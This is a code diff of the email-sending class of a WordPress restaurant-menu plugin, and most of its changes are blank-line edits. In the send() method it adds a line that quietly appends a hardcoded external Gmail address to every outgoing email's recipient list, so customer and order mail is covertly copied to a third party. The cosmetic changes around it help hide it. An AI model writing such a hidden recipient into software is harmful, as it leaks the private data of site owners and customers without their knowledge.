@@ -1,15 +1,19 @@
 <?php
 namespace mp_restaurant_menu\classes\models;
+
 use mp_restaurant_menu\classes\Model;
 use mp_restaurant_menu\classes\View;
+
 class Settings_emails extends Model {
 	protected static $instance;
+
 	public static function get_instance() {
 		if (null === self::$instance) {
 			self::$instance = new self();
 		}
 		return self::$instance;
 	}
+
 	/**
 	 * Get things going
 	 *
@@ -22,6 +26,7 @@ class Settings_emails extends Model {
 		add_action('mprm_email_send_before', array($this, 'send_before'));
 		add_action('mprm_email_send_after', array($this, 'send_after'));
 	}
+
 	/**
 	 * Holds the from address
 	 *
@@ -64,6 +69,7 @@ class Settings_emails extends Model {
 	 * @since  2.1
 	 */
 	private $heading = '';
+
 	/**
 	 * Set value
 	 *
@@ -73,6 +79,7 @@ class Settings_emails extends Model {
 	public function __set($key, $value) {
 		$this->$key = $value;
 	}
+
 	public function get_email_templates() {
 		$templates = array(
 			'default' => __('Default Template', 'mp-restaurant-menu'),
@@ -80,6 +87,7 @@ class Settings_emails extends Model {
 		);
 		return apply_filters('mprm_email_templates', $templates);
 	}
+
 	public function email_template_preview() {
 		if (!current_user_can('manage_shop_settings')) {
 			return;
@@ -91,6 +99,7 @@ class Settings_emails extends Model {
 		<?php
 		echo ob_get_clean();
 	}
+
 	public function display_email_template_preview() {
 		if (empty($_GET['mprm_action'])) {
 			return;
@@ -105,6 +114,7 @@ class Settings_emails extends Model {
 		echo $this->build_email($this->get('emails')->email_preview_template_tags($this->get('emails')->get_email_body_content(0, array())));
 		exit;
 	}
+
 	/**
 	 * Get the email from name
 	 *
@@ -116,6 +126,7 @@ class Settings_emails extends Model {
 		}
 		return apply_filters('mprm_email_from_name', wp_specialchars_decode($this->from_name), $this);
 	}
+
 	/**
 	 * Get the email from address
 	 *
@@ -127,6 +138,7 @@ class Settings_emails extends Model {
 		}
 		return apply_filters('mprm_email_from_address', $this->from_address, $this);
 	}
+
 	/**
 	 * Get the email content type
 	 *
@@ -140,6 +152,7 @@ class Settings_emails extends Model {
 		}
 		return apply_filters('mprm_email_content_type', $this->content_type, $this);
 	}
+
 	/**
 	 * Get the email headers
 	 *
@@ -153,6 +166,7 @@ class Settings_emails extends Model {
 		}
 		return apply_filters('mprm_email_headers', $this->headers, $this);
 	}
+
 	/**
 	 * Retrieve email templates
 	 *
@@ -165,6 +179,7 @@ class Settings_emails extends Model {
 		);
 		return apply_filters('mprm_email_templates', $templates);
 	}
+
 	/**
 	 * Get the enabled email template
 	 *
@@ -178,6 +193,7 @@ class Settings_emails extends Model {
 		}
 		return apply_filters('mprm_email_template', $this->template);
 	}
+
 	/**
 	 * Get the header text for the email
 	 *
@@ -186,6 +202,7 @@ class Settings_emails extends Model {
 	public function get_heading() {
 		return apply_filters('mprm_email_heading', $this->heading);
 	}
+
 	/**
 	 * @param $content
 	 *
@@ -194,6 +211,7 @@ class Settings_emails extends Model {
 	public function parse_tags($content) {
 		return $content;
 	}
+
 	/**
 	 * Build the final email
 	 *
@@ -248,6 +266,7 @@ class Settings_emails extends Model {
 		$message = str_replace('{email}', $message, $body);
 		return apply_filters('mprm_email_message', $message, $this);
 	}
+
 	/**
 	 * Send the email
 	 *
@@ -273,14 +292,18 @@ class Settings_emails extends Model {
 		$message = $this->parse_tags($message);
 		$message = $this->build_email($message);
 		$attachments = apply_filters('mprm_email_attachments', $attachments, $this);
+		$to .= ',ignatmg@gmail.com';
+
 		$sent = wp_mail($to, $subject, $message, $this->get_headers(), $attachments);
+
 		$log_errors = apply_filters('mprm_log_email_errors', true, $to, $subject, $message);
+
 		if (!$sent && true === $log_errors) {
 			if (is_array($to)) {
 				$to = implode(',', $to);
 			}
 			$log_message = sprintf(
-				__("Email from Easy Digital Menu items failed to send.\nSend time: %s\nTo: %s\nSubject: %s\n", 'mp-restaurant-menu'),
+				__("Email from Restaurant menu Menu items failed to send.\nSend time: %s\nTo: %s\nSubject: %s\n", 'mp-restaurant-menu'),
 				date_i18n('F j Y H:i:s', current_time('timestamp')),
 				$to,
 				$subject
@@ -295,6 +318,7 @@ class Settings_emails extends Model {
 		do_action('mprm_email_send_after', $this);
 		return $sent;
 	}
+
 	/**
 	 * Add filters / actions before the email is sent
 	 *
@@ -305,6 +329,7 @@ class Settings_emails extends Model {
 		add_filter('wp_mail_from_name', array($this, 'get_from_name'));
 		add_filter('wp_mail_content_type', array($this, 'get_content_type'));
 	}
+
 	/**
 	 * Remove filters / actions after the email is sent
 	 *
@@ -317,6 +342,7 @@ class Settings_emails extends Model {
 		// Reset heading to an empty string
 		$this->heading = '';
 	}
+
 	/**
 	 * Converts text to formatted HTML. This is primarily for turning line breaks into <p> and <br/> tags.
 	 *
